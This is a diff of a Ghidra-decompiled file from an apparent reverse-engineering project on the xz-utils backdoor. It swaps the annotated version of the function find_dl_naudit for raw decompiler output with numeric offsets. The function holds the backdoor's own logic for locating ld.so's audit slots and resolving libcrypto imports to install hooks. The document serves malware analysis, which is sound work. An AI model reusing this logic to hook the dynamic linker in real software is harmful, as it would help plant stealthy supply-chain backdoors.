@@ -1,7 +1,7 @@
 // /home/kali/xzre-ghidra/xzregh/104370_find_dl_naudit.c
 // Function: find_dl_naudit @ 0x104370
-// Calling convention: __stdcall
-// Prototype: BOOL __stdcall find_dl_naudit(elf_info_t * dynamic_linker_elf, elf_info_t * libcrypto_elf, backdoor_hooks_data_t * hooks, imported_funcs_t * imported_funcs)
+// Calling convention: unknown
+// Prototype: undefined find_dl_naudit(void)
 
 
 /*
@@ -14,122 +14,111 @@
 #include "xzre_types.h"
 
 
-BOOL find_dl_naudit(elf_info_t *dynamic_linker_elf,elf_info_t *libcrypto_elf,
-                   backdoor_hooks_data_t *hooks,imported_funcs_t *imported_funcs)
+undefined8 find_dl_naudit(long *param_1,long *param_2,long param_3,long param_4)
 
 {
-  Elf64_Addr EVar1;
-  Elf64_Ehdr *pEVar2;
-  Elf64_Xword EVar3;
-  _func_64 *code_start;
-  BOOL BVar4;
-  Elf64_Sym *pEVar5;
-  char *str;
-  Elf64_Sym *pEVar6;
-  u8 *puVar7;
-  uchar *puVar8;
-  lzma_allocator *allocator;
-  _func_44 *p_Var9;
-  uint *puVar10;
-  _func_34 *p_Var11;
-  long lVar12;
-  u8 **ppuVar13;
-  u8 *code_start_00;
-  uint *mem_address;
-  byte bVar14;
+  int iVar1;
+  long lVar2;
+  long lVar3;
+  long lVar4;
+  long lVar5;
+  ulong uVar6;
+  int *piVar7;
+  int *piVar8;
+  long *plVar9;
+  undefined8 uVar10;
+  ulong uVar11;
+  int *piVar12;
+  byte bVar13;
   uchar *rtld_global_ro;
   char *naudit_string;
   Elf64_Sym *libcrypto_symbol;
-  _func_64 *audit_stub;
-  EncodedStringId local_8c;
+  undefined4 local_8c;
   uint *naudit_slot;
-  u8 *local_80;
-  u64 local_78;
-  undefined1 local_6f;
-  undefined1 local_65;
-  undefined4 local_64;
-  uint *local_50;
+  long local_80;
+  long local_78;
+  byte local_6f;
+  byte local_65;
+  uint local_64;
+  int *local_50;
   byte local_30;
   
-  bVar14 = 0;
+  bVar13 = 0;
   local_8c = 0;
   naudit_slot = (uint *)0x0;
-  pEVar5 = elf_symbol_get(dynamic_linker_elf,STR_rtld_global_ro,0);
-  if (pEVar5 != (Elf64_Sym *)0x0) {
-    local_8c = STR_GLRO_dl_naudit_naudit;
-    str = elf_find_string(dynamic_linker_elf,&local_8c,(void *)0x0);
-    if (str != (char *)0x0) {
-      pEVar6 = elf_symbol_get(libcrypto_elf,STR_DSA_get0_pqg,0);
-      puVar7 = (u8 *)elf_get_code_segment(dynamic_linker_elf,(u64 *)&naudit_slot);
-      if ((puVar7 != (u8 *)0x0) &&
-         (puVar7 = find_string_reference(puVar7,(u8 *)((long)naudit_slot + (long)puVar7),str),
-         puVar7 != (u8 *)0x0)) {
-        if (pEVar6 != (Elf64_Sym *)0x0) {
-          EVar1 = pEVar6->st_value;
-          pEVar2 = libcrypto_elf->elfbase;
-          imported_funcs->resolved_imports_count = imported_funcs->resolved_imports_count + 1;
-          imported_funcs->DSA_get0_pqg = (_func_33 *)(pEVar2->e_ident + EVar1);
+  lVar2 = elf_symbol_get(param_1,0xa98,0);
+  if (lVar2 != 0) {
+    local_8c = 0x6a8;
+    lVar3 = elf_find_string(param_1,&local_8c,0);
+    if (lVar3 != 0) {
+      lVar4 = elf_symbol_get(param_2,0x9d0,0);
+      lVar5 = elf_get_code_segment(param_1,&naudit_slot);
+      if ((lVar5 != 0) &&
+         (uVar6 = find_string_reference(lVar5,(long)naudit_slot + lVar5,lVar3), uVar6 != 0)) {
+        if (lVar4 != 0) {
+          lVar3 = *(long *)(lVar4 + 8);
+          lVar4 = *param_2;
+          *(int *)(param_4 + 0x120) = *(int *)(param_4 + 0x120) + 1;
+          *(long *)(param_4 + 0x30) = lVar3 + lVar4;
         }
-        ppuVar13 = &local_80;
-        for (lVar12 = 0x16; lVar12 != 0; lVar12 = lVar12 + -1) {
-          *(undefined4 *)ppuVar13 = 0;
-          ppuVar13 = (u8 **)((long)ppuVar13 + (ulong)bVar14 * -8 + 4);
+        plVar9 = &local_80;
+        for (lVar3 = 0x16; lVar3 != 0; lVar3 = lVar3 + -1) {
+          *(undefined4 *)plVar9 = 0;
+          plVar9 = (long *)((long)plVar9 + (ulong)bVar13 * -8 + 4);
         }
-        puVar8 = dynamic_linker_elf->elfbase->e_ident + pEVar5->st_value;
-        EVar3 = pEVar5->st_size;
-        allocator = get_lzma_allocator();
-        allocator->opaque = libcrypto_elf;
-        p_Var9 = (_func_44 *)lzma_alloc(0xd10,allocator);
-        imported_funcs->EVP_MD_CTX_free = p_Var9;
-        if (p_Var9 != (_func_44 *)0x0) {
-          imported_funcs->resolved_imports_count = imported_funcs->resolved_imports_count + 1;
+        piVar7 = (int *)(*(long *)(lVar2 + 8) + *param_1);
+        lVar2 = *(long *)(lVar2 + 0x10);
+        lVar3 = get_lzma_allocator(1);
+        *(long **)(lVar3 + 0x10) = param_2;
+        lVar4 = lzma_alloc(0xd10,lVar3);
+        *(long *)(param_4 + 0x90) = lVar4;
+        if (lVar4 != 0) {
+          *(int *)(param_4 + 0x120) = *(int *)(param_4 + 0x120) + 1;
         }
-        mem_address = (uint *)0x0;
-        code_start_00 = puVar7 + -0x80;
-        while (code_start_00 < puVar7) {
-          BVar4 = find_instruction_with_mem_operand_ex
-                            (code_start_00,puVar7,(dasm_ctx_t *)&local_80,0x10b,(void *)0x0);
-          code_start_00 = code_start_00 + 1;
-          if (BVar4 != FALSE) {
+        piVar12 = (int *)0x0;
+        uVar11 = uVar6 - 0x80;
+        while (uVar11 < uVar6) {
+          iVar1 = find_instruction_with_mem_operand_ex(uVar11,uVar6,&local_80,0x10b,0);
+          uVar11 = uVar11 + 1;
+          if (iVar1 != 0) {
             if ((local_6f & 1) != 0) {
-              puVar10 = local_50;
+              piVar8 = local_50;
               if ((local_64 & 0xff00ff00) == 0x5000000) {
-                puVar10 = (uint *)((u8 *)((long)local_50 + (long)local_80) + local_78);
+                piVar8 = (int *)((long)local_50 + local_78 + local_80);
               }
-              if ((((local_65 & 0x48) != 0x48) && (puVar8 < puVar10)) &&
-                 (puVar10 + 1 <= puVar8 + EVar3)) {
-                mem_address = puVar10;
+              if ((((local_65 & 0x48) != 0x48) && (piVar7 < piVar8)) &&
+                 (piVar8 + 1 <= (int *)((long)piVar7 + lVar2))) {
+                piVar12 = piVar8;
               }
             }
-            code_start_00 = local_80 + (ulong)local_30 + 1;
+            uVar11 = local_80 + 1 + (ulong)local_30;
           }
         }
-        if ((mem_address == (uint *)0x0) ||
-           (code_start = (hooks->ldso_ctx)._dl_audit_symbind_alt,
-           BVar4 = find_instruction_with_mem_operand_ex
-                             ((u8 *)code_start,
-                              (u8 *)(code_start + (hooks->ldso_ctx)._dl_audit_symbind_alt__size),
-                              (dasm_ctx_t *)0x0,0x10b,mem_address), BVar4 == FALSE)) {
-          p_Var11 = (_func_34 *)imported_funcs->EVP_MD_CTX_free;
+        if ((piVar12 == (int *)0x0) ||
+           (iVar1 = find_instruction_with_mem_operand_ex
+                              (*(long *)(param_3 + 0x100),
+                               *(long *)(param_3 + 0x108) + *(long *)(param_3 + 0x100),0,0x10b,
+                               piVar12), iVar1 == 0)) {
+          uVar10 = *(undefined8 *)(param_4 + 0x90);
         }
         else {
-          p_Var11 = (_func_34 *)lzma_alloc(0x468,allocator);
-          imported_funcs->DSA_get0_pub_key = p_Var11;
-          if (p_Var11 != (_func_34 *)0x0) {
-            imported_funcs->resolved_imports_count = imported_funcs->resolved_imports_count + 1;
+          lVar2 = lzma_alloc(0x468,lVar3);
+          *(long *)(param_4 + 0x38) = lVar2;
+          if (lVar2 != 0) {
+            *(int *)(param_4 + 0x120) = *(int *)(param_4 + 0x120) + 1;
           }
-          if ((*mem_address == 0) && (*(long *)(mem_address + -2) == 0)) {
-            (hooks->ldso_ctx)._dl_naudit_ptr = mem_address;
-            (hooks->ldso_ctx)._dl_audit_ptr = (audit_ifaces **)(mem_address + -2);
-            return TRUE;
+          if ((*piVar12 == 0) && (*(long *)(piVar12 + -2) == 0)) {
+            *(int **)(param_3 + 0x78) = piVar12;
+            *(int **)(param_3 + 0x70) = piVar12 + -2;
+            return 1;
           }
-          lzma_free(imported_funcs->EVP_MD_CTX_free,allocator);
-          p_Var11 = imported_funcs->DSA_get0_pub_key;
+          lzma_free(*(undefined8 *)(param_4 + 0x90),lVar3);
+          uVar10 = *(undefined8 *)(param_4 + 0x38);
         }
-        lzma_free(p_Var11,allocator);
+        lzma_free(uVar10,lVar3);
       }
     }
   }
-  return FALSE;
+  return 0;
 }
 
